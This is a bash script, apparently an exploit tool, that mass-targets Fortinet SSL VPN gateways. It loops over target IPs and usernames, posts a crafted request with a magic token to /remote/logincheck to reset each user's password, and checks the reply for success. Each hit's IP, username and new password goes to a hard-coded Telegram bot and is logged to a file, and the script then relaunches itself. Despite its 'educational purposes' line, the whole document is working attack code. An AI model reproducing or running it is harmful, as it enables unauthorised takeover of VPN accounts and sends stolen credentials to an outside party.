#!/bin/bash
#coded by FOX 
#for educational purposes only

#cat success_new.txt | cut -d "," -f1 >> ips1.txt
#python compo.py 

echo "**************************************************"
echo "*                                                *"
echo "*              coded by FOX                      *"
echo "*         Fortinet Unauthenticated               *"
echo "*      SSL VPN User Password Modification        *"
echo "*                                                *"
echo "**************************************************"
sleep 1

function fuck () {
if curl -s  -k -X POST  --insecure "https://$tar/remote/logincheck" --data "ajax=1&magic=4tinet2095866&username=$u&realm=&credential=P@ss0wrdAa12@@@-AlFOX" | grep -a  "/remote/hostcheck"  >/dev/null
then 
echo -e "$tar - VULNERABLE"
curl -s --data chat_id="1708108446" --data-urlencode "text=AL-FOX:->> "IP:$tar,Username:$u:password:P@ss0wrdAa12@@@-AlFOX"" "https://api.telegram.org/bot5560825918:AAFo2p0glsnqT3WxqpEuMUTEWHmNDzVU6WE/sendMessage?parse_mode=HTML" >/dev/null
echo -e "$tar,$u,P@ss0wrdAa12@@@-AlFOX" >> success_new.txt
else 
echo -e "$tar - NOT_VULNERABLE"
fi
}

head -1 user.txt | tee -a user1.txt
sed -i 1d user.txt
for tar in `cat injectable.txt`
do
for u in  `cat user1.txt`
do
fuck $u $tar &
sleep 0.001
done 
done
sleep 180
rm -rf user1.txt 
./go_again
